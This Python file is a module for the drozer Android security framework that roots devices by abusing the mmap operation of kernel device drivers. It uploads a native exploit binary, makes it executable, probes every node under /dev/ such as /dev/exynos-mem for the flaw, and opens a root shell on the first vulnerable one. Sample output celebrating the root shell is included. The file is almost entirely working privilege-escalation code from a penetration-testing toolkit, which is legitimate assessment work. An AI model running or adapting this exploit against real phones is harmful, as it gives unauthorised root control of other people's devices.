import os
from drozer.modules import common, Module

class mmap_abuse(Module, common.Vulnerability, common.Shell, common.FileSystem, common.ClassLoader):

    name = "Iterate through all devices and attempt to exploit them to gain a root shell by abusing the mmap device operation."
    description = """Iterate through all devices and attempt to exploit them to gain a root shell by abusing the mmap device operation.

The exploit used by this module has been modified from the original posted by alephzain here: http://forum.xda-developers.com/showthread.php?p=35469999

!WARNING: This module could crash the device! If you know the vulnerable device path, rather specify it directly using --device
"""
    examples = """dz> run exploit.root.mmap_abuse 
[*] Uploading mmap-abuse
[*] Upload successful
[*] chmod 770 mmap-abuse
[*] Testing /dev/btlock
[*] Testing /dev/icdr
[*] Testing /dev/icd
<...snipped...>
[*] Testing /dev/exynos-mem
[+] /dev/exynos-mem is vulnerable!
[+] Enjoy your root shell...
app_129@android:/data/data/com.mwr.dz #
    """

    author = ["Tyrone (@mwrlabs)", "alephzain (xdadevelopers)"]
    date = "2013-12-12"
    license = "BSD (3 clause)"
    path = ["exploit", "root"]
    
    def add_arguments(self, parser):
        parser.add_argument("--device", help="path of the device to exploit directly")

    def isVulnerable(self, arguments):
        
        # Always return "Possibly Vulnerable" - not sure how to improve this
        return 2

    def exploit(self, arguments):

        # Get path to binary
        mmap_abuse = os.path.join(self.workingDir(), "mmap-abuse")
        
        # Remove if it is there
        self.shellExec("rm %s" % mmap_abuse)
        
        # Upload the exploit
        self.stdout.write("[*] Uploading mmap-abuse\n")
        length = self.uploadFile(os.path.join(os.path.dirname(__file__), "mmap-abuse", "libs", "armeabi", "mmap-abuse"), mmap_abuse)

        if length != None:
            self.stdout.write("[*] Upload successful\n")
            self.stdout.write("[*] chmod 770 mmap-abuse\n")
            self.shellExec("chmod 770 %s" % mmap_abuse)

            if arguments.device:
                self.shellStart("%s %s" % (mmap_abuse, arguments.device))
                return

            # Iterate through all devices
            for device in self.listFiles("/dev/"):
                device = "/dev/" + str(device).strip("/")
                self.stdout.write("[*] Testing %s\n" % device)
                status = self.shellExec("%s %s --test" % (mmap_abuse, device))
                if "Vulnerable" in status:
                    self.stdout.write("[+] %s is vulnerable!\n" % device)
                    self.stdout.write("[+] Enjoy your root shell...\n")
                    self.shellStart("%s %s" % (mmap_abuse, device))      
                    return 
            self.stdout.write("[-] No easy root shells here...\n\n")             
        else:
            self.stderr.write("[-] Could not upload file\n")
